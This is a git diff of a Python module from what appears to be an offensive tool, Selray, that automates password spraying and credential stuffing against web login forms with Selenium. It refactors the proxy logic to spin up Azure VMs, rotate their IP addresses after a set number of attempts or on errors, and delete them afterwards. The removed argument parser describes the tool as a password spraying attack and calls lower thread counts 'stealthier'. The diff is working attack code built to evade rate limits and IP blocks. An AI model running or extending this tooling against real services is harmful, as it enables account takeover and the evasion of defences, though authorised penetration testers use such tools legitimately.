@@ -1,21 +1,11 @@
 import sys
-from . import aws
-import argparse
+from . import aws, rotate_ip_if_needed
 from datetime import datetime, timedelta
 import pause
-from time import sleep
-from selenium import webdriver
-from selenium.webdriver import Keys
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support import expected_conditions as ec
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.common.exceptions import TimeoutException, WebDriverException
-from multiprocessing import Process, Queue
 import os
 import toml
-from seleniumbase import Driver
 import importlib.resources
-from . import azure_proxy, update, attempt_login
+from . import update, attempt_login, create_selray_vm, delete_vm_by_name
 import subprocess
 from pathlib import Path
 from importlib import resources as importlib_resources
@@ -33,101 +23,13 @@ class Colors:
     UNDERLINE = '\033[4m'
 
 
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
-    required = parser.add_argument_group("Required")
-    condition = parser.add_argument_group("Condition for Successful Login (One Required)")
-    optional = parser.add_argument_group("Optional")
-    aws_group = parser.add_argument_group("AWS Proxy Options")
-    azure_group = parser.add_argument_group("Azure Proxy Options")
-    proxy_group = parser.add_argument_group("Global Proxy Options")
-
-    required.add_argument('--url',
-                          help="(REQUIRED) URL of the website to spray.")
-    required.add_argument("-u", "--usernames",
-                          help="(REQUIRED) Username or file with list of usernames to spray. Alternatively, can be a"
-                               "list of colon-seperated credentials to spray (e.g. USER:PASS)")
-    required.add_argument("-p", "--passwords",
-                          help="(REQUIRED) Password or file with list of usernames to spray.")
-    required.add_argument('-uf', '--username-field', type=str,
-                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
-                               "a username into. Can be found by inspecting the username field in your browser. For"
-                               "example, if '<input type='email'>', enter 'type='email''")
-    required.add_argument('-pf', '--password-field', type=str,
-                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
-                               "a username into. Can be found by inspecting the username field in your browser. For"
-                               "example, if '<input type='email'>', enter 'type='email''")
-
-    condition.add_argument('-f', '--fail',
-                           help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as "
-                                "an alternative.")
-    condition.add_argument('-s', '--success',
-                           help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
-                                "used as an alternative")
-
-    optional.add_argument("-m", "--mode", help="Use a pre-built mode, eliminating the need for -uf,-pf,-f,-s, and -i. Mode name should correspond to the file name (minus extension) of a profile in the modes folder.")
-    optional.add_argument('-t', '--threads', type=int,
-                          help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. "
-                               "Default is 5.")
-    optional.add_argument('-dl', '--delay', type=int, default=30,
-                          help="(OPTIONAL) Length of time between passwords. The delay is between the first spray "
-                               "attempt with a password and the first attempt with the next password. Default is 30.")
-    optional.add_argument("-d", "--domain",
-                          help="(OPTIONAL) Prefix all usernames with a domain, with a forward slash (e.g. DOMAIN/USERNAME)")
-    optional.add_argument("-db", "--domain-backslash",
-                          help="(OPTIONAL) Prefix all usernames with a domain, with a backslash (e.g. DOMAIN\\USERNAME)")
-    optional.add_argument("-da", "--domain-after",
-                          help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain)")
-    optional.add_argument("-i", "--invalid-username", type=str,
-                          help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
-                               "strings can be provided comma seperated with no spaces.")
-    optional.add_argument('-l', '--lockout', type=str,
-                         help="(OPTIONAL) String(s) to look for to determine if the account has been locked. Multiple "
-                              "strings can be provided comma seperated with no spaces.")
-    optional.add_argument('-pl', '--passwordless', type=str,
-                          help="(OPTIONAL) String(s) to look for to determine if the account has been locked. Multiple "
-                              "strings can be provided comma seperated with no spaces.")
-    optional.add_argument('-nh', '--no-headless', action='store_true', default=False)
-    optional.add_argument('-cb', '--checkbox', type=str,
-                          help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
-                               "allowing the script to automatically check it. For example, if "
-                               "'<input type='checkbox'>', enter 'type='checkbox''")
-    optional.add_argument('-fp', '--file_prefix', type=str, default='',
-                          help="(OPTIONAL) Prefix for the output file names.")
-    optional.add_argument('-lm','--list_modes', action='store_true', default=False,
-                          help="(OPTIONAL) List all built-in modes available")
-
-    optional.add_argument('--update',
-                          nargs='?',               # Accepts 0 or 1 values
-                          const=True,
-                          default=False,
-                          help="(OPTIONAL) Update the script to the latest version (Only works if installed with PIPX). A branch can be specified with --update {BRANCH NAME}")
-
-    proxy_group.add_argument('--proxies', type=str,
-                          help="(OPTIONAL) Proxy URLs to proxy traffic through. Can be a file name (CSV or TXT) or a "
-                               "comma-separated list of proxies. If AWS or Azure proxies are also configured, both "
-                               "manually-specified and automatic proxies will be used.")
-    proxy_group.add_argument('--proxy-clean', action='store_true', help="(OPTIONAL) Clean up all created proxies, instead of spraying.")
-    proxy_group.add_argument('--proxy-list', action='store_true', help="(OPTIONAL) List all created proxies.")
-    proxy_group.add_argument('-n','--num_sprays_per_ip', type=int, help="(OPTIONAL) Number of sprays to perform per IP address. Default is 5.")
-
-    azure_group.add_argument('--azure', action='store_true', help="(OPTIONAL) Use Azure proxies. Default is False.")
-
-    aws_group.add_argument('--aws', action='store_true', help="(OPTIONAL) Use AWS proxies. Default is False.")
-    aws_group.add_argument("--aws-access-key", help="AWS Access Key ID")
-    aws_group.add_argument("--aws-secret-key", help="AWS Secret Access Key")
-    aws_group.add_argument("--aws-session-token", help="AWS Session Token (optional)")
-    aws_group.add_argument("--aws-region", help="AWS Region (defaults to us-east-2")
-
-    return parser.parse_args()
-
-
-def alternate_modes(args, ec2):
+def alternate_modes(args):
     if args.proxy_clean:
-        destroy_proxies(args, ec2)
+        destroy_proxies(args)
         exit()
     elif args.proxy_list:
-        list_proxies(args, ec2)
+        print("Getting list of proxies...\n")
+        list_proxies(args)
         exit()
     elif args.update:
         update.self_update(args.update)
@@ -295,18 +197,22 @@ def prepare_proxies(ec2, args):
     return proxies  # Proxies will always be a list of dicts.
 
 
-def destroy_proxies(args, ec2):
-    if ec2:
-        aws.terminate_instances_in_security_group(ec2, "Selray")
-    if args.azure:
-        azure_proxy.delete_proxies()
+def destroy_proxies(args):
+    from selray.utils import delete_selray_vms, delete_vm_by_name, list_selray_vms
+    if isinstance(args.proxy_clean, str):
+        vms = list_selray_vms(print_output=False)
+        match = next((vm for vm in vms if vm.get("name") == args.proxy_clean), None)
+        if not match:
+            print(f"No VM found with name: {args.proxy_clean}")
+            return
+        delete_vm_by_name(match["resource_group"], match["name"])
+    else:
+        delete_selray_vms()
 
 
-def list_proxies(args, ec2):
-    if ec2:
-        aws.list_instances(ec2, "Selray")
-    azure_proxy.list_proxies()
-
+def list_proxies(args):
+    from selray.utils import list_selray_vms
+    list_selray_vms()
 
 
 def print_beginning(args, version=None):
@@ -345,81 +251,72 @@ def print_beginning(args, version=None):
     print(f"{'Delay:':<28}{args.delay}\n")
 
 
-def perform_spray(spray_config, credentials, proxy, queue):
-    ec2 = aws.get_ec2_session(spray_config.aws_region, spray_config.aws_access_key, spray_config.aws_secret_key,
-                              spray_config.aws_session_token)
+def perform_spray(spray_config, credentials, queue):
     results = []
+    vm_url = ""
     spray_num_with_current_ip = 0
-    if proxy['type'] == 'AWS':
-        proxy['ip'], proxy['url'] = aws.start_ec2_instance(ec2, proxy['id'])
-
+    if spray_config.azure:
+        vm_name, vm_url, vm_ip, nic_name, credential, network_client, compute_client, owner = create_selray_vm(spray_config.azure_resource_group)
     for credential in credentials:
         spray_config.username = credential['USERNAME']
         spray_config.password = credential['PASSWORD']
-        if spray_num_with_current_ip >= spray_config.num_sprays_per_ip and proxy['type'] == 'AWS':
-            proxy['ip'], proxy['url'] = aws.refresh_instance_ip(ec2, proxy['id'])
-            spray_num_with_current_ip = 0
 
         # `attempt_login` returns a dictionary with:
         #   - USERNAME
         #   - PASSWORD
         #   - RESULT: one of ["INVALID USERNAME", "LOCKED", "PASSWORDLESS", "VALID USERNAME", "ERROR", "SUCCESS", "FAILURE"]
-        result = attempt_login.main(spray_config, proxy['url'])
+        result = attempt_login.main(spray_config, vm_url)
+
+        if spray_config.azure:
+            # If an error was returned, force a proxy IP change
+            if result.get("RESULT") == "ERROR":
+                spray_num_with_current_ip = 10000
+
+            # Force rotate on navigation/proxy errors to recover quickly.
+            spray_num_with_current_ip, new_ip, new_url, _ = rotate_ip_if_needed(
+                spray_config.azure_resource_group,
+                vm_name,
+                spray_config.num_sprays_per_ip,
+                spray_num_with_current_ip,
+                network_client,
+                compute_client,
+                nic_name,
+                spray_config.azure_location,
+            )
+
+            # rotate_ip_if_needed can return null urls and ips, so this just ensures we don't set them to null
+            if new_url:
+                vm_url = new_url
+            if new_ip:
+                vm_ip = new_ip
+
+            # If an error was encountered, try to log in again
+            if result.get("RESULT") == "ERROR":
+                result = attempt_login.main(spray_config, vm_url)
 
         results.append(result)
-        spray_num_with_current_ip += 1
-
-    if proxy['type'] == 'AWS':
-        aws.stop_ec2_instance(ec2, proxy['id'])
 
     queue.put(results)
+    delete_vm_by_name(spray_config.azure_resource_group, vm_name)
 
 
-def credential_stuffing(spray_config, args, proxies):
-    credentials = []
+def credential_stuffing(spray_config, args):
+    from . import credential_stuffing
+    from .spray import launch_spray_processes
     results = []
-    for credential in args.usernames:
-        username = credential.split(":")[0]
-        password = credential.split(":")[1]
-        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})
 
-    # Assign unique spray identifier
-    from collections import defaultdict
-    user_groups = defaultdict(list)
-    for d in credentials:
-        user_groups[d['USERNAME']].append(d)
-    for user, group in user_groups.items():  # Assigning sequential ATTEMPT values
-        for index, d in enumerate(group, start=1):
-            d['ATTEMPT'] = index
-    credentials = [d for group in user_groups.values() for d in group]  # Flatten the list
+    credentials = credential_stuffing.split_username_password(args.usernames)
+    credentials = credential_stuffing.assign_spray_identifier(credentials)
 
     stuffing_attempt = 1
     num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)
+
     while stuffing_attempt <= num_stuffing_attempts:
         next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
         print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")
 
-        credentials_to_spray = []
-        for credential in credentials:
-            if credential['ATTEMPT'] == stuffing_attempt:
-                credentials_to_spray.append(credential)
-
-        chunk_size = (len(credentials_to_spray) + len(proxies) - 1) // len(proxies)
-        user_chunks = [credentials_to_spray[i:i + chunk_size] for i in
-                       range(0, len(credentials_to_spray), chunk_size)]
-
-        processes = []
-        queue = Queue()
-        for proxy, user_chunk in zip(proxies, user_chunks):
-            p = Process(target=perform_spray, args=(spray_config, user_chunk, proxy, queue))
-            p.start()
-            processes.append(p)
-
-        for p in processes:
-            p.join()
-
-        while not queue.empty():
-            results.extend(queue.get())
+        user_chunks = credential_stuffing.split_users_into_chunks(credentials, stuffing_attempt, args.threads)
+        results.extend(launch_spray_processes(spray_config, user_chunks))
 
         # Check to see if the process is at the end. If not, wait the specified time.
         if stuffing_attempt < num_stuffing_attempts:
